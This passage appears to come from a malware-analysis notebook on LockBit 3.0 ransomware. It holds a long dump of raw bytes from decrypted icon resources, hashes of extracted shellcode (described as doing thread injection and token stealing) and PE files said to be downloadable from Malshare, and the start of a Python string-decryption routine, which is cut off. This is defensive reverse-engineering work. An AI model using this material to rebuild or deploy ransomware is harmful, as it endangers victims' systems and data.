x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00uuw x00 x00 x00 x00 x00 xff xff xff x03 xff xff xff x03 xff xff xff x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 xff xff xff x04 xff xff xff x04 xff xff xff x04 xff xff xff x04 xff xff xff x04 xff xff xff x04 xff xff xff x04 xff xff xff x04 xff xff xff x04 xff xff xff x03 xff xff xff x04 xff xff xff x04 xff xff xff x04 xff xff xff x03 xff xff xff x03 xff xff xff x04 xff xff xff x04 xff xff xff x04 x00 x00 x00 x00 xc9 xc9 xc8 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x02 xff xff xff x01 xfa xfa xfa xa9 xe2 xe2 xe2 xde xe2 xe2 xe3 xdc xe2 xe2 xe2 xde xe2 xe2 xe2 xde xe2 xe2 xe2 xde xe2 xe2 xe2 xde xe2 xe2 xe2 xde xe2 xe2 xe2 xde xe2 xe2 xe2 xde xd8 xd8 xd8 xde xf4 xf4 xf4 xdc xe3 xe3 xe3 xde xe2 xe2 xe3 xde xdb xdb xdb xde xea xea xea xdd xec xec xec xdd xe0 xe0 xe0 xde xe2 xe1 xe2 xdb xda xda xda xde xfc xfc xfc x8a xff xff xffd xff xff xff x93 xff xff xffY xff xff xff x15 xf9 xf9 xf9 x00 xff xff xff x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x06 xde xde xde xec!!! xff r r r xff x0f x0f x0f xff x10 x10 x10 xff x10 x10 x10 xff x10 x10 x10 xff x10 x10 x10 xff x11 x11 x11 xff x11 x11 x11 xffIIJ xff^^^ xff x16 x16 x17 xff x10 x10 x10 xff##% xffqqv xff$$$ xff x11 x11 x12 xff x08 x08 t xff x96 x96 x96 xff xff xff xff xff xa8 xa8 xa8 xffOOR xff x9a x9a x9b xff xed xed xef xe9 xff xff xffq xf8 xf8 xf8 x00 xff xff xff x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x06 xdd xdd xdd xe0 x00 x00 x00 xfe777 xfdWVW xfeNNO xfeQQR xfeQQR xfeQQR xfePPP xfeXXX xfeKKK xfe x00 x00 x00 xfe x00 x00 x00 xfe x10 x10 x12 xfecbi xfe x14 x13 x15 xfe x00 x00 x00 xfe x00 x00 x00 xfc x91 x91 x91 xfe xff xff xff xfe xd0 xd0 xd0 xfe[[] xfd333 xfb x04 x04 x04 xfb x16 x16 x18 xff xa9 xa9 xa9 xff xff xff xfe x96 xf6 xf6 xf6 x00 xfd xfd xfd x01 xfe xfe xfe x00 x00 x00 x00 x00 xff xff xff x05 xde xde xde xe1 x05 x05 x05 xffQQQ xfe x18 x18 x18 xfe x00 x00 x00 xff x00 x00 x00 xfe x00 x00 x00 xfe x00 x00 x00 xfe x00 x00 x00 xfe x00 x00 x00 xfe x00 x00 x00 xfe x00 x00 x00 xfe x08 x08 n xfeSSY xfe x06 x06 x07 xfe x00 x00 x00 xfe x05 x04 x05 xff x9b x9a x9b xff xff xff xff xff x9e x9e x9f xfe x00 x00 x00 xfe x00 x00 x00 xfb+++ xfebae xff,+2 xfd x05 x05 x05 xf8 xc4 xc4 xc7 xff xfb xfb xfbG x00 x00 x00 x00 xfe xfe xff x06 x00 x00 x00 x00 xff xff xff x06 xde xde xde xe2 x04 x04 x04 xffTTT xfe x03 x03 x03 xffooo xff xab xab xab xff xa4 xa4 xa4 xff xa7 xa7 xa7 xff xab xab xab xff xab xab xab xff xaf xaf xaf xff xaa xaa xaa xff xcb xca xcd xff xbe xbe xbf xff xa7 xa7 xa7 xff xaa xaa xab xff xc5 xc5 xc5 xff xff xff xff x96 xf6 xf6 xf7 xd2 xb3 xb3 xb3 xff xa8 xa8 xa8 xffwww xff n n n xff x00 x00 x00 xfedcl xff t t t xfbJIK xfd xff xff xff xb7 xda xda xda x00 xfe xfe xfd x07 x00 x00 x00 x00 xff xff xff x06 xdd xdd xdd xe2 x07 x07 x07 xff &#39; &#39; &#39; xfeNNO xfe xc0 xc0 xc0 xff xff xff xffW xff xff xff3 xff xff xff5 xff xff xff3 xff xff xff3 xff xff xff3 xff xff xff2 xff xff xff8 xff xff xff7 xff xff xff2 xff xff xff3 xff xff xff0 xf6 xf6 xf6 x00 xff xff xff# xff xff xff7 xff xff xff6 xff xff xff x87 xcc xcc xcd xfb n n t xfd $ xfe??F xfd x0c x0c x0b xfe xf0 xf0 xf1 xdbVVV x02 xdb xda xe3 x01 x00 x00 x00 x00 xff xff xff x06 xdb xdb xdb xe2 x10 x10 x10 xff x00 x00 x00 xfe!!&quot; xfe xd4 xd4 xd5 xfe xfb xfb xfb&quot; xfb xfb xfb x00 xfb xfb xfb x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 xfb xfb xfb x00 xfa xfa xfa x00 xff xff xff x97ccc xff x00 x00 x00 xfaONO xfe x06 x06 x06 xff xe4 xe4 xe4 xec xff xff xff x0f xfe xfe xff x00 x00 x00 x00 x00 xfc xfc xfc x05 xde xde xde xe1 x08 x08 x08 xff x01 x01 x01 xfd x00 x00 x00 xfe xaf xb0 xaf xfe xff xff xff. xfe xfe xfe x02 xff xff xff x04 xff xff xff x02 xff xff xff x02 x00 x00 x00 x02 xff xff xff x02 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfb xfb xfb x00 xfa xfa xfa x00 xff xff xff x92ggf xfe x00 x00 x01 xfaMMP xfd r r r xff xea xea xeb xdciii x03 xcb xcb xd0 x01 x00 x00 x00 x00 xdb xdb xdb x05 xec xec xec xe0[[[ xff x00 x00 x00 xfd x01 x01 x01 xfd xb4 xb4 xb4 xff xff xff xff- x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x01 xfd xfd xfd x00 xff xff xfff xff xff xff x91 xff xff xff x8f xff xff xff x91 xff xff xff x91 xff xff xff x91 xff xff xff x92 xff xff xff x90 xff xff xff xaa xcd xcd xce xfc x03 x03 x02 xfe99: xfe,,- xfc&quot;&quot;&quot; xfe xfb xfb xfb xccvuv x00 xf2 xf2 xf3 x04 x00 x00 x00 x00 xff xff xff x06 xd2 xd2 xd2 xe2@@@ xffWWX xfe x00 x00 x00 xfe xb1 xb1 xb1 xff xff xff xff, x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xf9 xf9 xf9 x00 xff xff xff x86 xb2 xb2 xb2 xffggg xffjjj xffhhh xffmmm xffuuu xffqqq xffddd xffAAC xff x02 x02 x03 xff,+1 xffcbl xff x00 x00 x00 xfallm xff xff xff xff x9b x00 x00 x00 x00 xff xff xff n x00 x00 x00 x00 xff xff xff x05 xdd xdd xdd xe1 x00 x00 x00 xff555 xfdIII xfd xb1 xb1 xb1 xff xff xff xff- x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 xff xff xff x01 xfe xfe xfe x03 xff xff xff x8c xdb xdb xdc xff=== xfa!!! xfa xfb#&quot;# xfb x0c x0c x0c xfb x00 x00 x00 xfb x00 x00 x00 xfb x08 x08 t xfb000 xfbXX[ xfeIHO xfe x05 x05 x07 xfe/// xfd xe1 xe1 xe1 xf1 xf2 xf2 xf2 &#39; xfb xfb xfb x00 xfe xfe xfe x03 x00 x00 x00 x00 xff xff xff x06 xdb xdb xdb xe2 x11 x11 x11 xff x00 x00 x00 xfe(() xfe xd8 xd8 xd8 xff xff xff xff, x00 x00 x00 x00 xff xff xff x01 xff xff xff x03 x00 x00 x00 x00 xfe xfe xfeK xba xba xba xff x1d x1d x1d xf5 x1c x1c x1c xfa&amp;%&amp; xfb&amp;&amp;&amp; xfb &#39; &#39; &#39; xfbMMM xfb))) xfb x00 x00 x00 xfb(() xfb`_` xfdppq xffDDD xfe x06 x06 x06 xfe444 xfd xe8 xe8 xe9 xee xef xef xef! xfb xfb xfb x00 xfe xfe xfe x02 x00 x00 x00 x00 xfb xfb xfb x05 xdf xdf xdf xe1 t n t xff x00 x00 x00 xfd x00 x00 x00 xfe xb1 xb1 xb1 xff xff xff xff, x00 x00 x00 x00 xff xff xff x01 xff xff xff x04 x00 x00 x00 x00 xff xff xff` xa9 xa9 xa9 xffBBB xffHIH xffEEE xffFFF xffFFF xffLLL xff x97 x97 x97 xff xff=== xff x1a x1a x1a xff x00 x00 x00 xfe../ xffbaf xff x00 x00 x00 xfauuu xff xff xff xff x93 x00 x00 x00 x00 xff xff xff n x00 x00 x00 x00 xe3 xe4 xe0 x05 xeb xeb xeb xe1__b xff x02 x02 x03 xfd x01 x01 x01 xfd xb3 xb3 xb3 xff xff xff xff- x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x1b xff xff xff x8c xff xff xff x93 xff xff xff x93 xff xff xff x94 xff xff xff x94 xff xff xff x94 xff xff xff x94 xff xff xff x93 xff xff xff x92 xff xff xff x9c xfc xfc xfc xd7 x94 x94 x94 xff x00 x00 x00 xfe??C xff((* xfc((( xfe xfd xfd xfd xc8 x97 x97 x9a x00 xf8 xf8 xf9 x05 x00 x00 x00 x00 xff xff xff x06 xd2 xd2 xd2 xe2::; xffSSU xfe x00 x00 x00 xfe xb3 xb3 xb3 xfe xff xff xff- x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xe1 xe1 xe1 x00 xfc xfc xfc x00 xfd xfd xfd x07 xff xff xff xbaIIJ xfe x06 x06 x05 xfbHHH xfd x0e x0e x11 xff xed xed xf0 xd8??O x01 xcb xca xde x01 x00 x00 x00 x00 xff xff xff x05 xde xde xde xe1 x00 x00 x00 xffUTV xfd x02 x02 x02 xfd xac xac xac xff xfd xfd xfd( xfc xfc xfc x00 xfd xfd xfd x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfd xfd xfd x02 xfc xfc xfc x00 xfa xfa xfatyyy xff x00 x00 x00 xf9OOP xfe x06 x06 x06 xff xe4 xe4 xe3 xec xff xff xff x0e xff xff xfe x00 x00 x00 x00 x00 xff xff xff x06 xdd xdd xdd xe2 x07 x07 x07 xffKKL xfe x00 x00 x00 xfe xba xba xba xfe xff xff xff= xff xff xff x16 xff xff xff x18 xff xff xff x16 xff xff xff x14 xff xff xff x16 xff xff xff x16 xff xff xff x15 xff xff xff x18 xff xff xff x18 xff xff xff x15 xff xff xff x16 xff xff xff x16 xff xff xff x16 xff xff xff x16 xff xff xff x17 xff xff xff5 xff xff xff xcd==@ xfe x0c x0c r xfcFFK xfd n n n xfe xef xef xef xdehhi x04 xe6 xe5 xe7 x01 x00 x00 x00 x00 xff xff xff x05 xde xde xde xe1 x07 x07 x07 xff&gt;&gt;&gt; xfe x96 x96 x96 xff xff xff xff xfe xe0 xe0 xe0 xf4 xcf xcf xcf xf3 xd2 xd2 xd2 xf3 xcf xcf xd0 xf3 xea xe9 xeb xf1 xc8 xc8 xc7 xf3 xd0 xd0 xd0 xf3 xcc xcc xcc xf2 xdf xdf xe0 xf4 xdc xdc xdc xf5 xc8 xc8 xc7 xf2 xd2 xd2 xd2 xf3 xd1 xd1 xd1 xf3 xd1 xd1 xd1 xf3 xd4 xd4 xd4 xf3 xcf xcf xcf xf2 xba xba xba xff [ xff x00 x00 x00 xfe]]b xff x0f x0f x0f xfbHHI xfd xff xff xff xb7 xd8 xd8 xd9 x00 xfc xfc xfc x07 x00 x00 x00 x00 xff xff xff x05 xdc xdc xdc xdf x00 x00 x00 xfe x99 x99 x99 xfd xff xff xff xfe xa8 xa8 xa8 xff x05 x05 x05 xff x00 x00 x00 xff x00 x00 x00 xff x05 x05 x05 xffBBE xffHHJ xff x00 x00 x00 xff x04 x04 x04 xff x13 x13 x13 xffa`e xff x17 x17 x18 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xfe x0c x0c r xfd _ xff98A xfe x00 x00 x00 xf8 xc1 xc1 xc4 xff xfc xfc xfcK x00 x00 x00 x00 xff xff xff x06 x00 x00 x00 x00 xf8 xf8 xf8 x06 xd3 xd3 xd3 xed x92 x92 x93 xff xff xff xff xfd xd0 xcf xd0 xffLLM xfeGGH xfeQQR xff32: xfe x00 x00 x00 xfe x00 x00 x00 xfeFEH xfeHHJ xfe x00 x00 x00 xfe x00 x00 x00 xfe x13 x13 x14 xff`_c xffONP xffKKL xffLKL xfeKKL xffLLL xfeVVZ xfeKKN xfd x12 x12 x11 xfb x05 x05 x05 xfd x9b x9b x9c xff xff xff xff x9c xf6 xf6 xf6 x00 xfd xfd xfd x01 xfd xfd xfd x00 xff xff xff x02 xe9 xe9 xe9 x00 xfa xfa xfa xa4 xff xff xff xff xaf xae xaf xff x0f x0f x0f xff x15 x14 x15 xff x17 x17 x18 xff x18 x18 x18 xffRP` xff@?L xff x03 x03 x03 xff x00 x00 x00 xffGFJ xffEEG xff x04 x04 x04 xff x00 x00 x00 xff x04 x04 x04 xff x17 x17 x17 xff x15 x15 x16 xff x16 x16 x16 xff x16 x16 x16 xff x16 x16 x17 xff x16 x16 x17 xff&amp;&amp;&amp; xffccc xff xd3 xd3 xd4 xfe xff xff xff x8e xf7 xf7 xf7 x00 xff xff xff x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfe xfe xfe x00 xfc xfc xfc x94 xcc xcc xcc xe5 xc3 xc3 xc3 xe5 xc4 xc4 xc4 xe8 xc3 xc3 xc3 xe8 xc2 xc2 xc2 xe8 xc2 xc2 xc1 xe8 xe7 xe6 xed xe2 xc9 xc9 xc9 xe8 xc9 xc9 xc9 xe8 xc0 xc0 xc0 xe8 xe6 xe6 xe7 xe2 xca xca xca xe7 xc9 xc9 xc9 xe8 xc7 xc7 xc7 xe8 xc2 xc2 xc2 xe8 xc3 xc3 xc3 xe8 xc3 xc3 xc3 xe8 xc3 xc3 xc2 xe8 xc5 xc5 xc5 xe6 xd8 xd8 xd9 xdf xfd xfd xfe xce xff xff xff x8e xff xff xff2 xfa xfa xfa x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xe2 xe2 xe2 x00 xff xff xff x01 xfe xfe xfe x00 xff xff xff t xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x07 xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x07 xff xff xff n xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff x0b xff xff xff n xff xff xff x05 xa4 xa1 xab x00 x00 x00 x00 x00 xcb xcb xcb x00 xfe xfe xfe x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfa xfa xfb x00 xff xff xff x03 xff xff xff x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xc0 x00 x00 x7f xc0 x00 x00 x0f xc0 x00 x00 x07 xc0 x00 x00 x07 xc0 x00 x00 x03 xc1 xff xfe x03 xc1 xff xff x03 xc1 xff xff x03 xc1 xfe x00 x03 xc1 xfc x00 x03 xc1 xf8 x00 x07 xc1 xf8 x00 x07 xc1 xf0 x00 x03 xc1 xf8 x00 x03 xc1 xff xff x03 xc1 xff xff x03 xc1 xff xff x03 xc0 x00 x00 x03 xc0 x00 x00 x07 xc0 x00 x00 x07 xc0 x00 x00 x0f xe0 x00 x00? xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff xff( x00 x00 x00 x10 x00 x00 x00 x00 x00 x00 x01 x00 x00 x00 x00 x00 x00@ x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xac xac xac x00 x00 x00 x00 x00 xb6 xb6 xb6 x00 xb6 xb6 xb6 x00 xb6 xb6 xb6 x00 xb5 xb5 xb5 x00 xbf xbf xbf x00 xb4 xb4 xb5 x00 xbb xbb xbc x00 xb5 xb5 xb6 x00 xb4 xb4 xb5 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfc xfc xfc x00 xee xee xee- xf7 xf7 xf8H xf4 xf4 xf4H xf5 xf5 xf5H xf3 xf3 xf3H xff xff xffG xff xff xffH xff xff xffH xff xff xffH xdd xdd xddE xff xff xff! xff xff xff x16 x00 x00 x00 x00 x00 x00 x00 x00 xf5 xf5 xf5 x00000 x00 x9c x9c x9c xc0FEF xffJJJ xffEEF xffHHH xffOOP xff//0 xffPPR xff889 xff xac xac xac xff xb5 xb5 xb5 xf8uuv xf1 xda xda xda x95 xdc xdc xdc x05 x00 x00 x00 x00 x00 x00 x00 x00 x86 x86 x86 xba$$$ xff999 xffMMN xffKKK xff=== xffYY[ xff@@@ xff x7f x7f x80 xf0 xd0 xd0 xd0 xfcQQQ xff x1d x1c x1f xff;;&gt; xff xcd xcd xcdy xa4 xa4 xa5 x00 x00 x00 x00 x00 x83 x83 x83 xb9 x16 x16 x16 xff xb2 xb2 xb3 xc6UUV5 xff xff xff6 xff xff xff6 xff xff xff1 xff xff xff &#39; xff xff xff x10 xfe xfe xff x1d xdc xdc xdcIZZZ xf1 x1f x1e! xff x95 x95 x95 xbf x00 x00 x00 x00 t t t x00 x9b x9b x9b xb8 x06 x06 x06 xff x90 x90 x90 xb3 x00 x00 x00 x00 xcb xcb xcc x00 xe9 xe9 xe9 x00 xff xff xff x05 xff xff xff2 xff xff xff6 xff xff xff3 xdc xdc xdc?jij xec x1f x1f xff x97 x97 x97 xb9 x05 x05 x05 x00 x07 x07 x07 x00 x92 x92 x92 xb8,,, xff x9b x9b x9b xb7 x10 x10 x10 x00 xf3 xf3 xf3 x00 xd5 xd5 xd5% xa8 xa8 xa9 xdcPPP xffMMM xff222 xffOOP xff//3 xff889 xff xd4 xd4 xd3q xad xad xae x00 x00 x00 x01 x00 x8a x8a x8a xb8 x06 x06 x06 xff xa1 xa1 xa1 xb6 x11 x11 x11 x00 x8e x8e x8e x00 xcd xcd xce xa2WWW xffAAB xffKKK xff666 xffDDE xff,,- xff;;&lt; xff xd7 xd7 xd7m xb5 xb5 xb5 x00 r r x0f x00 xa2 xa2 xa3 xb8 x1c x1c x1d xff x87 x87 x87 xb3 x00 x00 x00 x00 xde xde xde x00 xf3 xf3 xf3 x19 xe5 xe5 xe45 xf9 xf9 xf95 xfc xfc xfb5 xff xff xff5 xd8 xd8 xd8UYYY xf1 ! xff x98 x98 x99 xb7 n n x0c x00 x00 x00 x00 x00 x86 x86 x86 xb9### xff xab xab xab xc1111&amp; xff xff xff&amp; xff xff xff x1e xff xff xff x19 xff xff xff x19 xff xff xff x18 xff xff xff x18 xda xda xda &#39;tsu xe8 x1d x1d x1f xff x95 x95 x95 xc0 x00 x00 x00 x00 x01 x01 x01 x00~~~ xc1 x94 x94 x94 xff xae xae xae xfeNNN xfeUUV xfeaab xfeLLL xffjjl xffRQR xfePPP xfeRRR xff &#39; &#39;* xff77: xff xcd xcd xcdz xa3 xa3 xa4 x00 xd3 xd3 xd3 x00 xe6 xe6 xe6 x94 xc3 xc3 xc3 xffOOO xffJJN xff337 xff??@ xff222 xff334 xffCCD xff&gt;&gt;&gt; xffFFG xfffff xfd xd3 xd3 xd3 xa2 xd5 xd5 xd5 x06 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x03 xd3 xd3 xd3J xd1 xd1 xd1N xe3 xe3 xe4N xf9 xf8 xfcM xe2 xe2 xe2N xfb xfb xfbL xdf xdf xdfN xdd xdd xdcN xdd xdd xddN xea xea xeaJ xff xff xff) x00 x00 x00 x00 x00 x00 x00 x00 xf3 xf3 xf4 x00 xfc xfc xfc x00 x00 x00 x00 x00{{{ x00 x9f x9f x9f x00 x9f x9f xa0 x00 xac xac xb0 x00 x9d x9d x9d x00 xad xad xad x00 xa0 xa0 xa0 x00 xa0 xa0 xa0 x00 x99 x99 x99 x00 x97 x97 x97 x00 xcc xcb xcd x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff x00 x00 xff xff x00 x00 xff xff x00 x00 x80 x03 x00 x00 x80 x01 x00 x00 x8f xf1 x00 x00 x8f xf1 x00 x00 x8e x01 x00 x00 x8c x01 x00 x00 x8f xf1 x00 x00 x8f xf1 x00 x00 x80 x01 x00 x00 x80 x03 x00 x00 xff xff x00 x00 xff xff x00 x00 xff xff x00 x00&#39;) . 15086 . data = unhex(&#39;c520bca5cd3e3e89a0cc855b6c07abae452b39828382ad906bc8a97fbc9c4991143e3cfaf58e5b3529ca694ae4c909589312983f90b2a00d90b1701f50b5481fe061e6012f2ad0701fb7457dbaf35ada5dc96770e5c6a318d8fc01dbcfbf9c23d5ac331a&#39;) decrypt(data, seed) . b&#39;Q xc2 xee xcc x9f xb7twh xe7 x82JF] xbeU xa9 x9a x94. xbeM n xc4+/ x17 xec xad x11&gt;e x10 x82u xb0 xa3 xac xffeQ, x807 xa9O x87 x04O x1a1 x96b. xfa xbc xe0Zgh xde xdf xf1 xb9 x94 xd3 xb1O x18 xfd^7 xf5 xc3&amp;* xb1A xe6 x91 xa9 xe3 x986 xd3 x0e?x xee xa2 x1e xae xa1 x19 xf61 xab t xb3&#39; . Shellcode . Some of the encrypted data is shellcode that is used for thread injection, and token stealing. This code is not compressed. The shellcode files are listed below and can be downloaded from Malshare. . 0d2104672c11ff0822bf096e97225ceab74f1e2ecff7a2a6fde152a081b90b87.bin 2df9218c31586e1ce85d989ea97d9e6a6664d4a50b681914a5b6c44064d5c146.bin d8dd2530a4b2165f16547c237e43dc15adb6e168af5ae8b153793d7aee863d93.bin da2d72e132f9e8706676a72d9bf48a2bd26d9f8014686424ddb927b87637f2a1.bin . Icon . One of the blobs contains an aplib compressed .ico file that is used as a custom icon by Lockbit 3.0. . . PE Files . The blobs also contain 3 PE files that are compressed with aplib, the files are listed below (and can be downloaded from Malshare). . 63c8efca0f52ebea1b3b2305e17580402f797a90611b3507fab6fffa7f700383_pe.bin 917e115cc403e29b4388e0d175cbfac3e7e40ca1742299fbdb353847db2de7c2_pe.bin d641ad955ef4cff5f0239072b3990d47e17b9840e07fd5feea93c372147313c5_pe.bin . TODO: . print RSA key, and affiliate in a nice format | print key matrix data | analyze extracted PE files | . Stack Strings . import uuid import re import struct file_data = open(&#39;/tmp/lock3_dump_SCY.bin&#39;, &#39;rb&#39;).read() decryption_key = 0x4506DFCA def decrypt_str(data, decryption_key): result = b&#39;&#39; if (len(data) % 4)!= 0: return None for i in range(0, len(data), 4): dword = struct.unpack(&#39;&lt;I&#39;, data[i:i+4])[0] dword = (~(dword ^ decryption_key) &amp; 0xffffffff) result += dword.to_bytes(4, byteorder=&#39;little&#39;) return result def get_strings(file_data): out = {} egg = br&#39; xc7[ x00- 